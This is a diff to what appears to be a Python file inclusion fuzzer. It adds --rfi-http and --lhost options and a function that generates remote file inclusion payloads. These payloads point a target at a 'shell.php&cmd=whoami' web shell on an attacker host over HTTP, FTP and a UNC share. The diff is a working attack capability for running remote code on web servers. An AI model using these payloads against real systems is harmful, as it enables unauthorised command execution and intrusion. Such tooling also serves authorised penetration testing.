@@ -13,6 +13,8 @@ def get_args():
     args_group.add_argument("--fs", type=lambda s: list(map(int, s.split(','))), help="Filter responses by size. Provide one or more sizes separated by commas (e.g., 50,85).")
     args_group.add_argument("--threads", type=int, default=20, help="Specify the number of threads to use for concurrent requests.")
     args_group.add_argument("--timeout", type=int, default=5, help="Set the timeout duration (in seconds) for each request.")
+    args_group.add_argument("--rfi-http", type=str, help="")
+    args_group.add_argument("--lhost", type=str, help="")
 
     return parser.parse_args()
 
@@ -58,6 +60,9 @@ def generate_wordlist(args):
 
     result = add_php_wrappers(result)
 
+    if args.rfi_http is not None or args.lhost is not None:
+        result = add_remote_file_inclusion(result, args)
+
     return result
 
 
@@ -75,6 +80,17 @@ def add_php_wrappers(wordlist: list):
     for special_php_wrapper in special_php_wrappers:
         wordlist.append(special_php_wrapper)
 
+    return wordlist
+
+
+def add_remote_file_inclusion(wordlist, args):
+    if args.rfi_http is not None:
+        wordlist.append(f"{args.rfi_http}/shell.php&cmd=whoami")
+    
+    if args.lhost is not None:
+        wordlist.append(f"ftp://{args.lhost}/shell.php&cmd=whoami")
+        wordlist.append(f"\\\\{args.lhost}\\share\\shell.php&cmd=whoami")
+    
     return wordlist
 
 
